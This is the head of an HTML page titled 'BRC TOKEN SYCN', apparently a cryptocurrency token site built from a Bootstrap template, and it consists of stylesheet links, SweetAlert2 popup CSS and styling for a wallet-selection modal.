 
<!DOCTYPE html>
<html lang="en" class="u-responsive-xl">
<head>
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0" name="viewport">

  <title>BRC TOKEN SYCN</title>
  <!-- <link rel="stylesheet" href="nicepage.css" media="screen">
<link rel="stylesheet" href="Home.html" media="screen"> -->
  <meta content="" name="description">
  <meta content="" name="keywords">

  <!-- Favicons -->
  <!-- <link href="assets/img/blockchain-logo.png" rel="icon">
  <link href="assets/img/blockchain-logo.png" rel="apple-touch-icon"> -->

  <!-- Google Fonts -->
  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel="stylesheet">

  <!-- Vendor CSS Files -->
  <link href="assets/vendor/aos/aos.css" rel="stylesheet">
  <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
  <link href="assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
  <link href="assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
  <link href="assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
  <link href="assets/vendor/remixicon/remixicon.css" rel="stylesheet">
  <link href="assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">

  <!-- Template Main CSS File -->
  <link href="assets/css/style.css" rel="stylesheet">

  <!-- =======================================================
  * Template Name: Vesperr
  * Updated: Mar 10 2023 with Bootstrap v5.2.3
  * Template URL: https://bootstrapmade.com/vesperr-free-bootstrap-template/
  * Author: BootstrapMade.com
  * License: https://bootstrapmade.com/license/
  ======================================================== -->
  <link id="u-theme-google-font" rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:100,100i,300,300i,400,400i,500,500i,700,700i,900,900i|Open+Sans:300,300i,400,400i,500,500i,600,600i,700,700i,800,800i">
 
<style>.swal2-popup.swal2-toast{box-sizing:border-box;grid-column:1/4 !important;grid-row:1/4 !important;grid-template-columns:min-content auto min-content;padding:1em;overflow-y:hidden;background:#fff;box-shadow:0 0 1px rgba(0,0,0,.075),0 1px 2px rgba(0,0,0,.075),1px 2px 4px rgba(0,0,0,.075),1px 3px 8px rgba(0,0,0,.075),2px 4px 16px rgba(0,0,0,.075);pointer-events:all}.swal2-popup.swal2-toast>*{grid-column:2}.swal2-popup.swal2-toast .swal2-title{margin:.5em 1em;padding:0;font-size:1em;text-align:initial}.swal2-popup.swal2-toast .swal2-loading{justify-content:center}.swal2-popup.swal2-toast .swal2-input{height:2em;margin:.5em;font-size:1em}.swal2-popup.swal2-toast .swal2-validation-message{font-size:1em}.swal2-popup.swal2-toast .swal2-footer{margin:.5em 0 0;padding:.5em 0 0;font-size:.8em}.swal2-popup.swal2-toast .swal2-close{grid-column:3/3;grid-row:1/99;align-self:center;width:.8em;height:.8em;margin:0;font-size:2em}.swal2-popup.swal2-toast .swal2-html-container{margin:.5em 1em;padding:0;overflow:initial;font-size:1em;text-align:initial}.swal2-popup.swal2-toast .swal2-html-container:empty{padding:0}.swal2-popup.swal2-toast .swal2-loader{grid-column:1;grid-row:1/99;align-self:center;width:2em;height:2em;margin:.25em}.swal2-popup.swal2-toast .swal2-icon{grid-column:1;grid-row:1/99;align-self:center;width:2em;min-width:2em;height:2em;margin:0 .5em 0 0}.swal2-popup.swal2-toast .swal2-icon .swal2-icon-content{display:flex;align-items:center;font-size:1.8em;font-weight:bold}.swal2-popup.swal2-toast .swal2-icon.swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line]{top:.875em;width:1.375em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left]{left:.3125em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right]{right:.3125em}.swal2-popup.swal2-toast .swal2-actions{justify-content:flex-start;height:auto;margin:0;margin-top:.5em;padding:0 .5em}.swal2-popup.swal2-toast .swal2-styled{margin:.25em .5em;padding:.4em .6em;font-size:1em}.swal2-popup.swal2-toast .swal2-success{border-color:#a5dc86}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line]{position:absolute;width:1.6em;height:3em;transform:rotate(45deg);border-radius:50%}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=left]{top:-0.8em;left:-0.5em;transform:rotate(-45deg);transform-origin:2em 2em;border-radius:4em 0 0 4em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=right]{top:-0.25em;left:.9375em;transform-origin:0 1.5em;border-radius:0 4em 4em 0}.swal2-popup.swal2-toast .swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-popup.swal2-toast .swal2-success .swal2-success-fix{top:0;left:.4375em;width:.4375em;height:2.6875em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line]{height:.3125em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=tip]{top:1.125em;left:.1875em;width:.75em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=long]{top:.9375em;right:.1875em;width:1.375em}.swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-tip{animation:swal2-toast-animate-success-line-tip .75s}.swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-long{animation:swal2-toast-animate-success-line-long .75s}.swal2-popup.swal2-toast.swal2-show{animation:swal2-toast-show .5s}.swal2-popup.swal2-toast.swal2-hide{animation:swal2-toast-hide .1s forwards}.swal2-container{display:grid;position:fixed;z-index:1060;top:0;right:0;bottom:0;left:0;box-sizing:border-box;grid-template-areas:"top-start     top            top-end" "center-start  center         center-end" "bottom-start  bottom-center  bottom-end";grid-template-rows:minmax(min-content, auto) minmax(min-content, auto) minmax(min-content, auto);height:100%;padding:.625em;overflow-x:hidden;transition:background-color .1s;-webkit-overflow-scrolling:touch}.swal2-container.swal2-backdrop-show,.swal2-container.swal2-noanimation{background:rgba(0,0,0,.4)}.swal2-container.swal2-backdrop-hide{background:rgba(0,0,0,0) !important}.swal2-container.swal2-top-start,.swal2-container.swal2-center-start,.swal2-container.swal2-bottom-start{grid-template-columns:minmax(0, 1fr) auto auto}.swal2-container.swal2-top,.swal2-container.swal2-center,.swal2-container.swal2-bottom{grid-template-columns:auto minmax(0, 1fr) auto}.swal2-container.swal2-top-end,.swal2-container.swal2-center-end,.swal2-container.swal2-bottom-end{grid-template-columns:auto auto minmax(0, 1fr)}.swal2-container.swal2-top-start>.swal2-popup{align-self:start}.swal2-container.swal2-top>.swal2-popup{grid-column:2;align-self:start;justify-self:center}.swal2-container.swal2-top-end>.swal2-popup,.swal2-container.swal2-top-right>.swal2-popup{grid-column:3;align-self:start;justify-self:end}.swal2-container.swal2-center-start>.swal2-popup,.swal2-container.swal2-center-left>.swal2-popup{grid-row:2;align-self:center}.swal2-container.swal2-center>.swal2-popup{grid-column:2;grid-row:2;align-self:center;justify-self:center}.swal2-container.swal2-center-end>.swal2-popup,.swal2-container.swal2-center-right>.swal2-popup{grid-column:3;grid-row:2;align-self:center;justify-self:end}.swal2-container.swal2-bottom-start>.swal2-popup,.swal2-container.swal2-bottom-left>.swal2-popup{grid-column:1;grid-row:3;align-self:end}.swal2-container.swal2-bottom>.swal2-popup{grid-column:2;grid-row:3;justify-self:center;align-self:end}.swal2-container.swal2-bottom-end>.swal2-popup,.swal2-container.swal2-bottom-right>.swal2-popup{grid-column:3;grid-row:3;align-self:end;justify-self:end}.swal2-container.swal2-grow-row>.swal2-popup,.swal2-container.swal2-grow-fullscreen>.swal2-popup{grid-column:1/4;width:100%}.swal2-container.swal2-grow-column>.swal2-popup,.swal2-container.swal2-grow-fullscreen>.swal2-popup{grid-row:1/4;align-self:stretch}.swal2-container.swal2-no-transition{transition:none !important}.swal2-popup{display:none;position:relative;box-sizing:border-box;grid-template-columns:minmax(0, 100%);width:32em;max-width:100%;padding:0 0 1.25em;border:none;border-radius:5px;background:#fff;color:#545454;font-family:inherit;font-size:1rem}.swal2-popup:focus{outline:none}.swal2-popup.swal2-loading{overflow-y:hidden}.swal2-title{position:relative;max-width:100%;margin:0;padding:.8em 1em 0;color:inherit;font-size:1.875em;font-weight:600;text-align:center;text-transform:none;word-wrap:break-word}.swal2-actions{display:flex;z-index:1;box-sizing:border-box;flex-wrap:wrap;align-items:center;justify-content:center;width:auto;margin:1.25em auto 0;padding:0}.swal2-actions:not(.swal2-loading) .swal2-styled[disabled]{opacity:.4}.swal2-actions:not(.swal2-loading) .swal2-styled:hover{background-image:linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.1))}.swal2-actions:not(.swal2-loading) .swal2-styled:active{background-image:linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2))}.swal2-loader{display:none;align-items:center;justify-content:center;width:2.2em;height:2.2em;margin:0 1.875em;animation:swal2-rotate-loading 1.5s linear 0s infinite normal;border-width:.25em;border-style:solid;border-radius:100%;border-color:#2778c4 rgba(0,0,0,0) #2778c4 rgba(0,0,0,0)}.swal2-styled{margin:.3125em;padding:.625em 1.1em;transition:box-shadow .1s;box-shadow:0 0 0 3px rgba(0,0,0,0);font-weight:500}.swal2-styled:not([disabled]){cursor:pointer}.swal2-styled.swal2-confirm{border:0;border-radius:.25em;background:initial;background-color:#7066e0;color:#fff;font-size:1em}.swal2-styled.swal2-confirm:focus{box-shadow:0 0 0 3px rgba(112,102,224,.5)}.swal2-styled.swal2-deny{border:0;border-radius:.25em;background:initial;background-color:#dc3741;color:#fff;font-size:1em}.swal2-styled.swal2-deny:focus{box-shadow:0 0 0 3px rgba(220,55,65,.5)}.swal2-styled.swal2-cancel{border:0;border-radius:.25em;background:initial;background-color:#6e7881;color:#fff;font-size:1em}.swal2-styled.swal2-cancel:focus{box-shadow:0 0 0 3px rgba(110,120,129,.5)}.swal2-styled.swal2-default-outline:focus{box-shadow:0 0 0 3px rgba(100,150,200,.5)}.swal2-styled:focus{outline:none}.swal2-styled::-moz-focus-inner{border:0}.swal2-footer{justify-content:center;margin:1em 0 0;padding:1em 1em 0;border-top:1px solid #eee;color:inherit;font-size:1em}.swal2-timer-progress-bar-container{position:absolute;right:0;bottom:0;left:0;grid-column:auto !important;overflow:hidden;border-bottom-right-radius:5px;border-bottom-left-radius:5px}.swal2-timer-progress-bar{width:100%;height:.25em;background:rgba(0,0,0,.2)}.swal2-image{max-width:100%;margin:2em auto 1em}.swal2-close{z-index:2;align-items:center;justify-content:center;width:1.2em;height:1.2em;margin-top:0;margin-right:0;margin-bottom:-1.2em;padding:0;overflow:hidden;transition:color .1s,box-shadow .1s;border:none;border-radius:5px;background:rgba(0,0,0,0);color:#ccc;font-family:serif;font-family:monospace;font-size:2.5em;cursor:pointer;justify-self:end}.swal2-close:hover{transform:none;background:rgba(0,0,0,0);color:#f27474}.swal2-close:focus{outline:none;box-shadow:inset 0 0 0 3px rgba(100,150,200,.5)}.swal2-close::-moz-focus-inner{border:0}.swal2-html-container{z-index:1;justify-content:center;margin:1em 1.6em .3em;padding:0;overflow:auto;color:inherit;font-size:1.125em;font-weight:normal;line-height:normal;text-align:center;word-wrap:break-word;word-break:break-word}.swal2-input,.swal2-file,.swal2-textarea,.swal2-select,.swal2-radio,.swal2-checkbox{margin:1em 2em 3px}.swal2-input,.swal2-file,.swal2-textarea{box-sizing:border-box;width:auto;transition:border-color .1s,box-shadow .1s;border:1px solid #d9d9d9;border-radius:.1875em;background:rgba(0,0,0,0);box-shadow:inset 0 1px 1px rgba(0,0,0,.06),0 0 0 3px rgba(0,0,0,0);color:inherit;font-size:1.125em}.swal2-input.swal2-inputerror,.swal2-file.swal2-inputerror,.swal2-textarea.swal2-inputerror{border-color:#f27474 !important;box-shadow:0 0 2px #f27474 !important}.swal2-input:focus,.swal2-file:focus,.swal2-textarea:focus{border:1px solid #b4dbed;outline:none;box-shadow:inset 0 1px 1px rgba(0,0,0,.06),0 0 0 3px rgba(100,150,200,.5)}.swal2-input::placeholder,.swal2-file::placeholder,.swal2-textarea::placeholder{color:#ccc}.swal2-range{margin:1em 2em 3px;background:#fff}.swal2-range input{width:80%}.swal2-range output{width:20%;color:inherit;font-weight:600;text-align:center}.swal2-range input,.swal2-range output{height:2.625em;padding:0;font-size:1.125em;line-height:2.625em}.swal2-input{height:2.625em;padding:0 .75em}.swal2-file{width:75%;margin-right:auto;margin-left:auto;background:rgba(0,0,0,0);font-size:1.125em}.swal2-textarea{height:6.75em;padding:.75em}.swal2-select{min-width:50%;max-width:100%;padding:.375em .625em;background:rgba(0,0,0,0);color:inherit;font-size:1.125em}.swal2-radio,.swal2-checkbox{align-items:center;justify-content:center;background:#fff;color:inherit}.swal2-radio label,.swal2-checkbox label{margin:0 .6em;font-size:1.125em}.swal2-radio input,.swal2-checkbox input{flex-shrink:0;margin:0 .4em}.swal2-input-label{display:flex;justify-content:center;margin:1em auto 0}.swal2-validation-message{align-items:center;justify-content:center;margin:1em 0 0;padding:.625em;overflow:hidden;background:#f0f0f0;color:#666;font-size:1em;font-weight:300}.swal2-validation-message::before{content:"!";display:inline-block;width:1.5em;min-width:1.5em;height:1.5em;margin:0 .625em;border-radius:50%;background-color:#f27474;color:#fff;font-weight:600;line-height:1.5em;text-align:center}.swal2-icon{position:relative;box-sizing:content-box;justify-content:center;width:5em;height:5em;margin:2.5em auto .6em;border:0.25em solid rgba(0,0,0,0);border-radius:50%;border-color:#000;font-family:inherit;line-height:5em;cursor:default;user-select:none}.swal2-icon .swal2-icon-content{display:flex;align-items:center;font-size:3.75em}.swal2-icon.swal2-error{border-color:#f27474;color:#f27474}.swal2-icon.swal2-error .swal2-x-mark{position:relative;flex-grow:1}.swal2-icon.swal2-error [class^=swal2-x-mark-line]{display:block;position:absolute;top:2.3125em;width:2.9375em;height:.3125em;border-radius:.125em;background-color:#f27474}.swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left]{left:1.0625em;transform:rotate(45deg)}.swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right]{right:1em;transform:rotate(-45deg)}.swal2-icon.swal2-error.swal2-icon-show{animation:swal2-animate-error-icon .5s}.swal2-icon.swal2-error.swal2-icon-show .swal2-x-mark{animation:swal2-animate-error-x-mark .5s}.swal2-icon.swal2-warning{border-color:#facea8;color:#f8bb86}.swal2-icon.swal2-warning.swal2-icon-show{animation:swal2-animate-error-icon .5s}.swal2-icon.swal2-warning.swal2-icon-show .swal2-icon-content{animation:swal2-animate-i-mark .5s}.swal2-icon.swal2-info{border-color:#9de0f6;color:#3fc3ee}.swal2-icon.swal2-info.swal2-icon-show{animation:swal2-animate-error-icon .5s}.swal2-icon.swal2-info.swal2-icon-show .swal2-icon-content{animation:swal2-animate-i-mark .8s}.swal2-icon.swal2-question{border-color:#c9dae1;color:#87adbd}.swal2-icon.swal2-question.swal2-icon-show{animation:swal2-animate-error-icon .5s}.swal2-icon.swal2-question.swal2-icon-show .swal2-icon-content{animation:swal2-animate-question-mark .8s}.swal2-icon.swal2-success{border-color:#a5dc86;color:#a5dc86}.swal2-icon.swal2-success [class^=swal2-success-circular-line]{position:absolute;width:3.75em;height:7.5em;transform:rotate(45deg);border-radius:50%}.swal2-icon.swal2-success [class^=swal2-success-circular-line][class$=left]{top:-0.4375em;left:-2.0635em;transform:rotate(-45deg);transform-origin:3.75em 3.75em;border-radius:7.5em 0 0 7.5em}.swal2-icon.swal2-success [class^=swal2-success-circular-line][class$=right]{top:-0.6875em;left:1.875em;transform:rotate(-45deg);transform-origin:0 3.75em;border-radius:0 7.5em 7.5em 0}.swal2-icon.swal2-success .swal2-success-ring{position:absolute;z-index:2;top:-0.25em;left:-0.25em;box-sizing:content-box;width:100%;height:100%;border:.25em solid rgba(165,220,134,.3);border-radius:50%}.swal2-icon.swal2-success .swal2-success-fix{position:absolute;z-index:1;top:.5em;left:1.625em;width:.4375em;height:5.625em;transform:rotate(-45deg)}.swal2-icon.swal2-success [class^=swal2-success-line]{display:block;position:absolute;z-index:2;height:.3125em;border-radius:.125em;background-color:#a5dc86}.swal2-icon.swal2-success [class^=swal2-success-line][class$=tip]{top:2.875em;left:.8125em;width:1.5625em;transform:rotate(45deg)}.swal2-icon.swal2-success [class^=swal2-success-line][class$=long]{top:2.375em;right:.5em;width:2.9375em;transform:rotate(-45deg)}.swal2-icon.swal2-success.swal2-icon-show .swal2-success-line-tip{animation:swal2-animate-success-line-tip .75s}.swal2-icon.swal2-success.swal2-icon-show .swal2-success-line-long{animation:swal2-animate-success-line-long .75s}.swal2-icon.swal2-success.swal2-icon-show .swal2-success-circular-line-right{animation:swal2-rotate-success-circular-line 4.25s ease-in}.swal2-progress-steps{flex-wrap:wrap;align-items:center;max-width:100%;margin:1.25em auto;padding:0;background:rgba(0,0,0,0);font-weight:600}.swal2-progress-steps li{display:inline-block;position:relative}.swal2-progress-steps .swal2-progress-step{z-index:20;flex-shrink:0;width:2em;height:2em;border-radius:2em;background:#2778c4;color:#fff;line-height:2em;text-align:center}.swal2-progress-steps .swal2-progress-step.swal2-active-progress-step{background:#2778c4}.swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step{background:#add8e6;color:#fff}.swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step-line{background:#add8e6}.swal2-progress-steps .swal2-progress-step-line{z-index:10;flex-shrink:0;width:2.5em;height:.4em;margin:0 -1px;background:#2778c4}[class^=swal2]{-webkit-tap-highlight-color:rgba(0,0,0,0)}.swal2-show{animation:swal2-show .3s}.swal2-hide{animation:swal2-hide .15s forwards}.swal2-noanimation{transition:none}.swal2-scrollbar-measure{position:absolute;top:-9999px;width:50px;height:50px;overflow:scroll}.swal2-rtl .swal2-close{margin-right:initial;margin-left:0}.swal2-rtl .swal2-timer-progress-bar{right:0;left:auto}@keyframes swal2-toast-show{0%{transform:translateY(-0.625em) rotateZ(2deg)}33%{transform:translateY(0) rotateZ(-2deg)}66%{transform:translateY(0.3125em) rotateZ(2deg)}100%{transform:translateY(0) rotateZ(0deg)}}@keyframes swal2-toast-hide{100%{transform:rotateZ(1deg);opacity:0}}@keyframes swal2-toast-animate-success-line-tip{0%{top:.5625em;left:.0625em;width:0}54%{top:.125em;left:.125em;width:0}70%{top:.625em;left:-0.25em;width:1.625em}84%{top:1.0625em;left:.75em;width:.5em}100%{top:1.125em;left:.1875em;width:.75em}}@keyframes swal2-toast-animate-success-line-long{0%{top:1.625em;right:1.375em;width:0}65%{top:1.25em;right:.9375em;width:0}84%{top:.9375em;right:0;width:1.125em}100%{top:.9375em;right:.1875em;width:1.375em}}@keyframes swal2-show{0%{transform:scale(0.7)}45%{transform:scale(1.05)}80%{transform:scale(0.95)}100%{transform:scale(1)}}@keyframes swal2-hide{0%{transform:scale(1);opacity:1}100%{transform:scale(0.5);opacity:0}}@keyframes swal2-animate-success-line-tip{0%{top:1.1875em;left:.0625em;width:0}54%{top:1.0625em;left:.125em;width:0}70%{top:2.1875em;left:-0.375em;width:3.125em}84%{top:3em;left:1.3125em;width:1.0625em}100%{top:2.8125em;left:.8125em;width:1.5625em}}@keyframes swal2-animate-success-line-long{0%{top:3.375em;right:2.875em;width:0}65%{top:3.375em;right:2.875em;width:0}84%{top:2.1875em;right:0;width:3.4375em}100%{top:2.375em;right:.5em;width:2.9375em}}@keyframes swal2-rotate-success-circular-line{0%{transform:rotate(-45deg)}5%{transform:rotate(-45deg)}12%{transform:rotate(-405deg)}100%{transform:rotate(-405deg)}}@keyframes swal2-animate-error-x-mark{0%{margin-top:1.625em;transform:scale(0.4);opacity:0}50%{margin-top:1.625em;transform:scale(0.4);opacity:0}80%{margin-top:-0.375em;transform:scale(1.15)}100%{margin-top:0;transform:scale(1);opacity:1}}@keyframes swal2-animate-error-icon{0%{transform:rotateX(100deg);opacity:0}100%{transform:rotateX(0deg);opacity:1}}@keyframes swal2-rotate-loading{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}@keyframes swal2-animate-question-mark{0%{transform:rotateY(-360deg)}100%{transform:rotateY(0)}}@keyframes swal2-animate-i-mark{0%{transform:rotateZ(45deg);opacity:0}25%{transform:rotateZ(-25deg);opacity:.4}50%{transform:rotateZ(15deg);opacity:.8}75%{transform:rotateZ(-5deg);opacity:1}100%{transform:rotateX(0);opacity:1}}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown){overflow:hidden}body.swal2-height-auto{height:auto !important}body.swal2-no-backdrop .swal2-container{background-color:rgba(0,0,0,0) !important;pointer-events:none}body.swal2-no-backdrop .swal2-container .swal2-popup{pointer-events:all}body.swal2-no-backdrop .swal2-container .swal2-modal{box-shadow:0 0 10px rgba(0,0,0,.4)}@media print{body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown){overflow-y:scroll !important}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown)>[aria-hidden=true]{display:none}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) .swal2-container{position:static !important}}body.swal2-toast-shown .swal2-container{box-sizing:border-box;width:360px;max-width:100%;background-color:rgba(0,0,0,0);pointer-events:none}body.swal2-toast-shown .swal2-container.swal2-top{top:0;right:auto;bottom:auto;left:50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-top-end,body.swal2-toast-shown .swal2-container.swal2-top-right{top:0;right:0;bottom:auto;left:auto}body.swal2-toast-shown .swal2-container.swal2-top-start,body.swal2-toast-shown .swal2-container.swal2-top-left{top:0;right:auto;bottom:auto;left:0}body.swal2-toast-shown .swal2-container.swal2-center-start,body.swal2-toast-shown .swal2-container.swal2-center-left{top:50%;right:auto;bottom:auto;left:0;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-center{top:50%;right:auto;bottom:auto;left:50%;transform:translate(-50%, -50%)}body.swal2-toast-shown .swal2-container.swal2-center-end,body.swal2-toast-shown .swal2-container.swal2-center-right{top:50%;right:0;bottom:auto;left:auto;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-start,body.swal2-toast-shown .swal2-container.swal2-bottom-left{top:auto;right:auto;bottom:0;left:0}body.swal2-toast-shown .swal2-container.swal2-bottom{top:auto;right:auto;bottom:0;left:50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-end,body.swal2-toast-shown .swal2-container.swal2-bottom-right{top:auto;right:0;bottom:0;left:auto}</style><style>@import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;family=Nunito:ital,wght@0,400;0,500;0,600;0,700;1,400;1,500;1,600;1,700&amp;display=swap");[class~=ms_modal_head] title{font-size:32px;}[class~=ms_modal_head] title{font-style:normal;}[class~=ms_modal]{position:absolute;}[class~=ms_modal]{top:50%;}#ms-modal{position:fixed;}[class~=ms_modal]{left:50%;}[class~=ms_modal_head] title{font-weight:700;}[class~=ms_modal_head] title{line-height:normal;}[class~=ms_modal]{transform:translate(-50%,-50%);}[class~=ms_modal]{box-sizing:border-box;}#ms-modal .black .ms_stroke_con span{}[class~=ms_modal]{width:calc(100% - 20px);}[class~=ms_modal],[class~=ms_modal_content]{display:flex;}[class~=ms_modal_head] title,#ms-modal{display:block;}[class~=ms_modal_head] title{letter-spacing:.003333333in;}.ms_modal_button button,#ms-modal button.active{border-radius:16px;}.ms_modal_button button,.ms_modal_head{display:flex;}.ms_modal_button button{padding-left:0pt;}[class~=ms_modal]{max-width:420pt;}.ms_modal_button button{padding-bottom:.208333333in;}[class~=ms_modal]{padding-left:2pc;}[class~=ms_modal]{padding-bottom:2pc;}[class~=ms_modal]{padding-right:2pc;}.ms_modal_button button{padding-right:0pt;}.ms_modal_button button{padding-top:.208333333in;}[class~=ms_modal]{padding-top:2pc;}[class~=ms_modal_menu_first],[class~=ms_modal_menu],[class~=ms_modal_el-title],[class~=ms_modal_content],.ms_modal_head,[class~=ms_modal]{flex-direction:column;}[class~=ms_modal_content],.ms_modal_head,[class~=ms_modal]{align-items:flex-start;}[class~=ms_modal]{gap:.416666667in;}[class~=ms_modal]{border-radius:32px;}.ms_modal_button button{justify-content:center;}[class~=ms_modal_menu],.ms_modal_button button{align-items:center;}.ms_modal_button button{gap:.083333333in;}[class~=ms_modal_menu_first],[class~=ms_modal_content],[class~=ms_modal_menu],.ms_modal_button button{align-self:stretch;}[class~=ms_modal_content]{gap:32px;}#ms-modal button.active{background:linear-gradient(91deg,#4200fd 0%,#0056fd 98.05%);}.ms_modal_head{gap:8px;}#ms-modal button[class~=disabled],#ms-modal .black button.disabled{opacity:.2;}[class~=ms_modal][class~=white]{background:#fff;}.ms_modal_button button{font-family:Inter;}[class~=ms_modal][class~=white]{color:#01091b;}
[class~=ms_head_body]{color:#3a455f;}[class~=ms_head_body]{font-size:.1875in;}[class~=ms_head_body],.ms_modal_button button{font-style:normal;}[class~=ms_head_body]{font-weight:400;}#ms-modal,[class~=ms_modal_button]{width:100%;}.ms_modal_button button{outline:0pc;}.ms_modal_button button{font-size:.166666667in;}.ms_modal_button button{font-weight:700;}#ms-modal button.active{color:white;}.ms_modal_button button{line-height:normal;}#ms-modal [class~=black] [class~=ms_modal_el-title-second],#ms-modal [class~=black] [class~=ms_head_body]{color:#959eb0;}[class~=ms_modal_button]{display:grid;}.ms_modal_button button{letter-spacing:.12pt;}.ms_modal_button button{border-left-width:0pc;}[class~=ms_modal_el-content],[class~=ms_modal_menu_first],[class~=ms_modal_el],[class~=ms_modal_el-title],[class~=ms_modal_menu],[class~=ms_modal_menu_second],.ms_modal_el input{display:flex;}.ms_modal_button button{border-bottom-width:0pc;}[class~=ms_modal_menu],[class~=ms_modal_el-content]{gap:1.25pc;}.ms_modal_button button{border-right-width:0pc;}.ms_modal_button button{border-top-width:0pc;}.ms_modal_button button{border-left-style:none;}[class~=ms_modal_el],#ms-modal button.active{cursor:pointer;}[class~=ms_modal_menu_first]{align-items:flex-start;}[class~=ms_modal_el]{padding-left:15pt;}#ms-modal button[class~=disabled]{background:#c5c5c5;}[class~=ms_modal_el]{padding-bottom:15pt;}#ms-modal{height:100%;}[class~=ms_modal_el]{padding-right:15pt;}[class~=ms_modal_el]{padding-top:15pt;}[class~=ms_modal_el]{justify-content:space-between;}#ms-modal{inset:0pc;}#ms-modal{background:rgba(8,5,23,.5);}[class~=ms_modal_el-content],[class~=ms_modal_el]{align-items:center;}[class~=ms_modal_el]{align-self:stretch;}[class~=ms_modal_el]{border-radius:24px;}[class~=ms_modal_el]{transition:all .8s ease-out 0s;}[class~=ms_modal_el]:hover{outline:#4200fd solid .75pt;}#ms-modal button[class~=disabled]{color:#01091b;}.ms_modal_button button{border-bottom-style:none;}.ms_modal_button button{border-right-style:none;}.ms_modal_button button{border-top-style:none;}[class~=ms_modal_el-title],[class~=ms_modal_menu_second],.ms_modal_el input{align-items:flex-start;}[class~=ms_modal_el-title]{gap:4px;}[class~=ms_modal_el-title-first]{font-size:13.5pt;}[class~=ms_stroke_con] span,[class~=ms_modal_el-title-first],
[class~=ms_modal_el-title-second]{font-style:normal;}.ms_modal_button button{border-left-color:currentColor;}[class~=ms_modal_el-title-first]{font-weight:500;}.ms_modal_button button{border-bottom-color:currentColor;}[class~=ms_modal_el-title-first]{line-height:normal;}[class~=ms_modal_el-title-first]{letter-spacing:.01125pc;}#ms-modal .black button.disabled{background:#545454;}.ms_modal_button button{border-right-color:currentColor;}.ms_modal_button button{border-top-color:currentColor;}.ms_modal_button button{border-image:none;}[class~=ms_modal_el-title-second]{color:rgba(57,69,96,.8);}[class~=ms_stroke_con] span,[class~=ms_modal_el-title-second]{font-family:Inter;}#ms-modal{z-index:99999;}[class~=ms_modal_el-content] svg{width:32px;}[class~=ms_modal_el-content] svg{height:24pt;}[class~=ms_modal_el-title-second],[class~=ms_stroke_con] span{font-size:1pc;}.ms_modal_el input{width:20px;}.ms_modal_el input{height:.208333333in;}.ms_modal_el input{padding-left:.052083333in;}.ms_modal_el input{padding-bottom:.052083333in;}[class~=ms_modal_el-title-second],[class~=ms_stroke_con] span{font-weight:400;}[class~=modal_stroke],.ms_stroke_con{width:100%;}.ms_modal_el input{padding-right:.052083333in;}.ms_stroke_con{position:relative;}.ms_stroke_con{margin-bottom:5px;}[class~=modal_stroke]{height:.0625pc;}[class~=modal_stroke]{background:#ccd1db;}#ms-modal{font-family:Inter,sans-serif;}.ms_modal_el input{padding-top:.052083333in;}[class~=ms_modal_menu_second]{flex-direction:column;}[class~=ms_stroke_con] span{color:#939bac;}[class~=ms_modal_menu_second]{gap:6pt;}[class~=ms_stroke_con] span{position:absolute;}[class~=ms_modal_el]:hover{box-shadow:rgba(34,43,254,.29) 0in 5px 1pc 0pt;}[class~=ms_modal_menu_second]{align-self:stretch;}[class~=ms_stroke_con] span{background:#fff;}[class~=ms_stroke_con] span{top:-10px;}[class~=ms_stroke_con] span{width:46px;}[class~=ms_stroke_con] span{margin-left:auto;}[class~=ms_stroke_con] span{margin-right:auto;}[class~=ms_stroke_con] span{left:0pt;}[class~=ms_stroke_con] span{right:0in;}[class~=ms_stroke_con] span{text-align:center;}[class~=ms_modal][class~=black]{background:#0d0e13;}[class~=ms_modal][class~=black]{color:#fff;}@media (min-width: 200px) and (max-width: 500px){.ms_head_body,[class~=ms_modal_el-title-second]{display:none;}}
